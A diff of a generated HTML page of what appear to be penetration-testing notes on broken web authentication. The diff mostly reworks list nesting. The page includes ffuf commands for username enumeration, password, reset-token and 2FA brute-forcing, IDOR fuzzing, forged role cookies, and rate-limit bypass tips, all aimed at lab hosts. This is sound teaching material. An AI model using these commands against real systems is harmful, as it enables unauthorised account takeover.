@@ -682,6 +682,23 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Session Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cookies" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cookies
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
         
       </ul>
@@ -1718,6 +1735,23 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Session Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cookies" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cookies
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
         
       </ul>
@@ -1892,50 +1926,52 @@
 <p>Weaknesses often arise from insufficient server-side validation, predictable or low-entropy tokens, lack of rate limiting, overly verbose error messages, or missing access checks that rely only on client-side redirects.</p>
 <h2 id="identification">Identification</h2>
 <ul>
-<li>Analyse login, reset, or MFA responses for differences that indicate valid vs. invalid usernames/accounts (varying error messages, HTTP status codes, response delays/timing, or account lockout behaviour).</li>
+<li>Analyse login, reset, or MFA responses for differences that indicate valid vs. invalid usernames/accounts (varying error messages, HTTP status codes, response delays/timing, or account lockout behaviour).<ul>
 <li>Status code changes between valid and invalid usernames.</li>
 <li>Different (sometimes subtle) error messages.</li>
 <li>Delayed responses for certain inputs.</li>
 <li>Correct usernames may receive a lockout message after a certain number of failed login attempts (while invalid usernames do not).</li>
-<li>Probe for absence of rate limiting or weak protections on authentication actions such as login attempts, password resets, and 2FA code submission.</li>
+</ul>
+</li>
+<li>Probe for absence of rate limiting or weak protections on authentication actions such as login attempts, password resets, and 2FA code submission.<ul>
 <li>Correct/successful login details may receive a different rate limit response (or none) compared to failed attempts.</li>
-<li>Examine session cookies or other tokens for patterns: insufficient entropy, sequential/incrementing values, encoding of user data (e.g. base64), or large fixed portions with only small varying components.</li>
+</ul>
+</li>
+<li>Examine session cookies or other tokens for patterns: insufficient entropy, sequential/incrementing values, encoding of user data (e.g. base64), or large fixed portions with only small varying components.<ul>
 <li>Check "stay logged in" or persistent cookies to see if they are easily decrypted or contain predictable data.</li>
+</ul>
+</li>
 <li>Attempt direct navigation to protected URLs and observe whether authentication/authorisation is properly enforced server-side.</li>
-<li>Review password reset and recovery flows for guessable tokens, logic issues (e.g. token not required after initial step), or information leakage.</li>
+<li>Review password reset and recovery flows for guessable tokens, logic issues (e.g. token not required after initial step), or information leakage.<ul>
 <li>Check if a reset URL token is easily decrypted or predictable.</li>
 <li>Verify whether the reset token is actually required to complete the password reset after the initial link is followed.</li>
 <li>Test for different error messages when new password fields do not match (these differences can sometimes be abused to brute-force values for a victim's account during reset).</li>
+</ul>
+</li>
 <li>Test whether client-side controls, parameter values, or response status codes can be manipulated to bypass authentication.</li>
 </ul>
 <h2 id="exploitation">Exploitation</h2>
 <h3 id="brute-force-attacks">Brute-Force Attacks</h3>
 <ul>
-<li><strong>User Enumeration</strong> </li>
-</ul>
+<li><strong>User Enumeration</strong> 
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1">ffuf<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt<span class="w"> </span>-u<span class="w"> </span>http://172.17.0.2/index.php<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;username=FUZZ&amp;password=invalid&quot;</span><span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;Unknown user&quot;</span>
-</span></code></pre></div></td></tr></table></div>
-<ul>
-<li><strong>Brute-Forcing Passwords</strong></li>
-</ul>
+</span></code></pre></div></td></tr></table></div></li>
+<li><strong>Brute-Forcing Passwords</strong>
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1">grep<span class="w"> </span><span class="s1">&#39;[[:upper:]]&#39;</span><span class="w"> </span>/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;[[:lower:]]&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;[[:digit:]]&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;.{10}&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>custom_wordlist.txt
 </span><span id="__span-1-2">ffuf<span class="w"> </span>-w<span class="w"> </span>./custom_wordlist.txt<span class="w"> </span>-u<span class="w"> </span>http://172.17.0.2/index.php<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;username=admin&amp;password=FUZZ&quot;</span><span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;Invalid username or password&quot;</span>
-</span></code></pre></div></td></tr></table></div>
-<ul>
-<li><strong>Brute-Forcing Password Reset Tokens</strong> (example based on weak 4 digit reset token sent via email)</li>
-</ul>
+</span></code></pre></div></td></tr></table></div></li>
+<li><strong>Brute-Forcing Password Reset Tokens</strong> (example based on weak 4 digit reset token sent via email)
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1">seq<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">9999</span><span class="w"> </span>&gt;<span class="w"> </span>tokens.txt<span class="w"> </span><span class="c1"># -w pads numbers with prepending zeros</span>
 </span><span id="__span-2-2">ffuf<span class="w"> </span>-w<span class="w"> </span>./tokens.txt<span class="w"> </span>-u<span class="w"> </span>http://weak_reset.htb/reset_password.php?token<span class="o">=</span>FUZZ<span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;The provided token is invalid&quot;</span>
-</span></code></pre></div></td></tr></table></div>
-<ul>
-<li><strong>Brute-Forcing 2FA Codes</strong> (example based on weak 4 digit TOTP token)</li>
-</ul>
+</span></code></pre></div></td></tr></table></div></li>
+<li><strong>Brute-Forcing 2FA Codes</strong> (example based on weak 4 digit TOTP token)
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1">seq<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">9999</span><span class="w"> </span>&gt;<span class="w"> </span>tokens.txt
 </span><span id="__span-3-2">ffuf<span class="w"> </span>-w<span class="w"> </span>./tokens.txt<span class="w"> </span>-u<span class="w"> </span>http://bf_2fa.htb/2fa.php<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;otp=FUZZ&quot;</span><span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;Invalid 2FA Code&quot;</span>
-</span></code></pre></div></td></tr></table></div>
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
 <h3 id="bypassing-brute-force-protection">Bypassing Brute-Force Protection</h3>
 <ul>
 <li><strong>Rate Limit</strong>: X-Forwarded-For HTTP Header can be randomised (or use other headers such as X-Forward-Host in some flows).</li>
@@ -1970,11 +2006,13 @@
 </ul>
 <h3 id="authentication-bypasses">Authentication Bypasses</h3>
 <ul>
-<li>Accessing the protected page directly</li>
+<li>Accessing the protected page directly<ul>
 <li>go directly to hidden page /admin.php</li>
 <li>catch the response in burp</li>
 <li>change status code from 302 to 200</li>
-<li>Manipulating HTTP Parameters to access protected pages</li>
+</ul>
+</li>
+<li>Manipulating HTTP Parameters to access protected pages<ul>
 <li>Log in as regular user directs to /admin.php?user_id=183</li>
 <li>guess or bruteforce id parameter
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
@@ -1982,9 +2020,11 @@
 </span><span id="__span-5-2">ffuf<span class="w"> </span>-w<span class="w"> </span>user_ids.txt<span class="w"> </span>-u<span class="w"> </span>http://STMIP:STMPO/admin.php?user_id<span class="o">=</span>FUZZ<span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;Could not load admin data.&quot;</span>
 </span></code></pre></div></td></tr></table></div></li>
 </ul>
+</li>
+</ul>
 <h3 id="session-attacks">Session Attacks</h3>
+<h4 id="cookies">Cookies</h4>
 <ul>
-<li><strong>Cookies</strong></li>
 <li>Check if "stay logged in" or persistent cookies are easily decrypted or contain guessable/predictable values (see token analysis examples below).</li>
 <li>Brute-Forcing cookies with insufficient entropy<ul>
 <li>Capture multiple session tokens and compare for similarities</li>
@@ -1998,17 +2038,21 @@
 </span><span id="__span-6-2"><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;user=htb-stdnt;role=admin&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span><span class="c1"># base64 encode</span>
 </span><span id="__span-6-3"><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;user=htb-stdnt;role=admin&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xxd<span class="w"> </span>-p<span class="w"> </span><span class="c1"># hex encode</span>
 </span></code></pre></div></td></tr></table></div></li>
+<li>XSS can be used to steal session cookies from other users (see related XSS documentation).</li>
 </ul>
 </li>
-<li>XSS can be used to steal session cookies from other users (see related XSS documentation).</li>
-<li><strong><a href="https://owasp.org/www-community/attacks/Session_fixation">Session Fixation</a></strong></li>
+<li><strong><a href="https://owasp.org/www-community/attacks/Session_fixation">Session Fixation</a></strong><ul>
 <li>Attacker obtains valid session identifier</li>
 <li>Attacker coerces victim to use this session identifier (social engineering)</li>
 <li>Victim authenticates to the vulnerable web application</li>
 <li>Attacker knows the victim's session identifier and can hijack their account</li>
-<li><strong><a href="https://owasp.org/www-community/Session_Timeout">Improper Session Timeout</a></strong></li>
+</ul>
+</li>
+<li><strong><a href="https://owasp.org/www-community/Session_Timeout">Improper Session Timeout</a></strong><ul>
 <li>Sessions should expire after an appropriate time interval</li>
 <li>Session validity duration depends on the web application</li>
+</ul>
+</li>
 </ul>
 <h2 id="impact">Impact</h2>
 <p>Successful exploitation of broken authentication can result in:</p>
